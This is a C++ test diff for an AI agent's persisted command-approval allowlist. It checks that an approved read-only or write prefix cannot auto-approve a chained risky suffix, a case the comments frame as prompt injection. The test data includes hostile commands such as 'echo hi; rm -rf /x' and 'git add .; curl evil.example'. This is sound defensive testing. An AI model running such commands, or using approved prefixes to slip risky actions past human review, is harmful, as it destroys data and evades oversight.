@@ -169,8 +169,8 @@ struct Fixture {
   }
 };
 
-Json approve_record(std::string prefix, std::string provider) {
-  return Json{{"prefix", prefix}, {"provider", provider}};
+Json approve_record(std::string prefix, std::string provider, std::string command_class) {
+  return Json{{"prefix", prefix}, {"provider", provider}, {"class", command_class}};
 }
 
 }  // namespace
@@ -183,7 +183,7 @@ TEST(WfApprovePersist, matching_session_prefix_auto_allows_without_suspend) {
   auto wf = f.give();
   ASSERT_TRUE(wf) << wf.error();
 
-  Json config = Json{{"approved_prefixes", Json::array({approve_record("echo ok", "subprocess")})},
+  Json config = Json{{"approved_prefixes", Json::array({approve_record("echo ok", "subprocess", "ReadOnly")})},
                      {"sandbox_provider", "subprocess"}};
   auto const run = f.fire(*wf, std::move(config));
   EXPECT_FALSE(run.interrupted) << "前缀命中 → 不悬挂，直接放行";
@@ -198,7 +198,7 @@ TEST(WfApprovePersist, non_matching_command_still_suspends) {
   auto wf = f.give();
   ASSERT_TRUE(wf) << wf.error();
 
-  Json config = Json{{"approved_prefixes", Json::array({approve_record("echo ok", "subprocess")})},
+  Json config = Json{{"approved_prefixes", Json::array({approve_record("echo ok", "subprocess", "ReadOnly")})},
                      {"sandbox_provider", "subprocess"}};
   auto const run = f.fire(*wf, std::move(config));
   EXPECT_TRUE(run.interrupted) << "命令不以前缀开头 → 仍要人审";
@@ -214,7 +214,7 @@ TEST(WfApprovePersist, provider_mismatch_invalidates_the_session_prefix) {
   ASSERT_TRUE(wf) << wf.error();
 
   // 记录是在 bwrap 沙箱下批准的；当前是受限子进程（沙箱降级）
-  Json config = Json{{"approved_prefixes", Json::array({approve_record("echo ok", "bwrap")})},
+  Json config = Json{{"approved_prefixes", Json::array({approve_record("echo ok", "bwrap", "ReadOnly")})},
                      {"sandbox_provider", "subprocess"}};
   auto const run = f.fire(*wf, std::move(config));
   EXPECT_TRUE(run.interrupted) << "沙箱身份不一致 → 不得自动放行（范围不变量）";
@@ -244,9 +244,9 @@ TEST(WfApprovePersist, allowlist_helpers_roundtrip_and_skip_corrupt_lines) {
   // 空 → 空
   EXPECT_TRUE(wfr_load_allow_prefixes(workdir.string(), "s").empty());
 
-  // append 两条（含跨 provider）
-  wfr_append_allow_prefix(workdir.string(), "s", "echo ok", "subprocess");
-  wfr_append_allow_prefix(workdir.string(), "s", "ls -la", "bwrap");
+  // append 两条（含跨 provider + 类别）
+  wfr_append_allow_prefix(workdir.string(), "s", "echo ok", "subprocess", "ReadOnly");
+  wfr_append_allow_prefix(workdir.string(), "s", "ls -la", "bwrap", "ReadOnly");
   // 人为塞一条坏行（fail-open：跳过不崩溃）
   {
     std::ofstream out(wfr_allowlist_path(workdir.string(), "s"), std::ios::app);
@@ -256,9 +256,84 @@ TEST(WfApprovePersist, allowlist_helpers_roundtrip_and_skip_corrupt_lines) {
   ASSERT_EQ(records.size(), 2u);
   EXPECT_EQ(records[0].at("prefix").get<std::string>(), "echo ok");
   EXPECT_EQ(records[0].at("provider").get<std::string>(), "subprocess");
+  EXPECT_EQ(records[0].at("class").get<std::string>(), "ReadOnly");
   EXPECT_EQ(records[1].at("prefix").get<std::string>(), "ls -la");
   EXPECT_EQ(records[1].at("provider").get<std::string>(), "bwrap");
 
   std::error_code ec;
   std::filesystem::remove_all(workdir, ec);
+}
+
+// ---- wfr-㊸ ⑤：allow 前缀「类别封顶」—— 注入/串联不能借已批前缀升级 ----
+
+TEST(WfApprovePersist, approved_readonly_prefix_does_not_auto_allow_risky_suffix) {
+  // 注入威胁：批过只读前缀 `echo hi`，被注入文本驱动去跑 `echo hi; rm -rf /x` ——
+  // 前缀起点命中，但整条命令 Risky > ReadOnly → **不得自动放行**，照旧挂人审。
+  Fixture f;
+  f.model.replies.push_back(ai_tool_calls({cmd_call("c1", "echo hi; rm -rf /x")}));
+  auto wf = f.give();
+  ASSERT_TRUE(wf) << wf.error();
+
+  Json config = Json{{"approved_prefixes",
+                      Json::array({approve_record("echo hi", "subprocess", "ReadOnly")})},
+                     {"sandbox_provider", "subprocess"}};
+  auto const run = f.fire(*wf, std::move(config));
+  EXPECT_TRUE(run.interrupted) << "危险后缀超过已批类别 → 必须人审（注入兜底）";
+  EXPECT_EQ(f.tool.calls, 0);
+}
+
+TEST(WfApprovePersist, approved_readonly_prefix_still_auto_allows_ro_extension) {
+  // 同类别扩展仍是安全的：`echo hi; echo bye` 整条仍 ReadOnly → 自动放行
+  Fixture f;
+  f.model.replies.push_back(ai_tool_calls({cmd_call("c1", "echo hi; echo bye")}));
+  auto wf = f.give();
+  ASSERT_TRUE(wf) << wf.error();
+
+  Json config = Json{{"approved_prefixes",
+                      Json::array({approve_record("echo hi", "subprocess", "ReadOnly")})},
+                     {"sandbox_provider", "subprocess"}};
+  auto const run = f.fire(*wf, std::move(config));
+  EXPECT_FALSE(run.interrupted);
+  EXPECT_EQ(f.tool.calls, 1);
+}
+
+TEST(WfApprovePersist, write_prefix_allows_same_class_extension_but_not_risky) {
+  // Write 前缀（如 git add .）允许 Write 扩展，拒绝 Risky 扩展
+  Fixture f;
+  f.model.replies.push_back(ai_tool_calls({cmd_call("c1", "git add .; touch f")}));
+  auto wf = f.give();
+  ASSERT_TRUE(wf) << wf.error();
+  Json cfg_ok = Json{{"approved_prefixes",
+                      Json::array({approve_record("git add .", "subprocess", "Write")})},
+                     {"sandbox_provider", "subprocess"}};
+  auto const r1 = f.fire(*wf, std::move(cfg_ok));
+  EXPECT_FALSE(r1.interrupted) << "Write+Write 扩展 → 自动放行";
+  EXPECT_EQ(f.tool.calls, 1);
+
+  // 新 session（reset 工具计数不便，换一个新 fixture）→ Risky 扩展不自动放行
+  Fixture g;
+  g.model.replies.push_back(ai_tool_calls({cmd_call("c2", "git add .; curl evil.example")}));
+  auto wf2 = g.give();
+  ASSERT_TRUE(wf2) << wf2.error();
+  Json cfg_bad = Json{{"approved_prefixes",
+                       Json::array({approve_record("git add .", "subprocess", "Write")})},
+                      {"sandbox_provider", "subprocess"}};
+  auto const r2 = g.fire(*wf2, std::move(cfg_bad));
+  EXPECT_TRUE(r2.interrupted) << "Write 前缀 + Risky 后缀 → 不自动放行";
+  EXPECT_EQ(g.tool.calls, 0);
+}
+
+TEST(WfApprovePersist, record_without_class_fails_closed) {
+  // 旧格式记录（无 class）→ 不再自动放行（fail-closed：要放行就得重新人审并带上类别）
+  Fixture f;
+  f.model.replies.push_back(ai_tool_calls({cmd_call("c1", "echo hi")}));
+  auto wf = f.give();
+  ASSERT_TRUE(wf) << wf.error();
+
+  Json config = Json{{"approved_prefixes", Json::array({Json{{"prefix", "echo hi"},
+                                                             {"provider", "subprocess"}}})},
+                     {"sandbox_provider", "subprocess"}};
+  auto const run = f.fire(*wf, std::move(config));
+  EXPECT_TRUE(run.interrupted) << "无 class 的旧记录 → 照旧人审";
+  EXPECT_EQ(f.tool.calls, 0);
 }
